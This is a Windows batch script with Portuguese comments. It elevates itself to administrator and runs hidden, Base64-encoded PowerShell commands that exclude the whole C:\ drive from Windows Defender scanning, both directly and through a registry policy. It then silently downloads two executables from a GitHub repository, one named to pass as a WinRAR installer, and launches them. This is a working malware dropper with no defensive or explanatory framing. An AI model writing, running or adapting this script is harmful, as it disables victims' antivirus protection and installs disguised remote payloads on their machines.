@echo off
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

:: Executa os comandos encoded e ignora qualquer erro (escondido)
powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBjAG8AbQBtAGEAbgBkACAAIgBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAIgBDADoAXAANAAoA >nul 2>&1

powershell -WindowStyle Hidden -EncodedCommand cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgAEMAOgBcACAALwB0ACAAUgBFAEcAXwBEAFcATwBSAEQAIAAvAGQAIAAwACAALwBmAA== >nul 2>&1

:: Links e caminhos
set URL1=https://github.com/smoking105/op/raw/refs/heads/main/winrar-x64-712.exe
set URL2=https://github.com/smoking105/op/raw/refs/heads/main/tru.exe

set TEMP_PATH=%TEMP%
mkdir "%TEMP_PATH%" >nul 2>&1

set DEST1=%TEMP_PATH%\winrar-x64-712.exe
set DEST2=%TEMP_PATH%\tru.exe

:: Baixar arquivos (com cmd invisível)
powershell -WindowStyle Hidden -Command "Invoke-WebRequest '%URL1%' -OutFile '%DEST1%' -UseBasicParsing" >nul 2>&1
powershell -WindowStyle Hidden -Command "Invoke-WebRequest '%URL2%' -OutFile '%DEST2%' -UseBasicParsing" >nul 2>&1

:: Executar os arquivos (normal, com janela)
start "" "%DEST1%"
start "" "%DEST2%"
exit
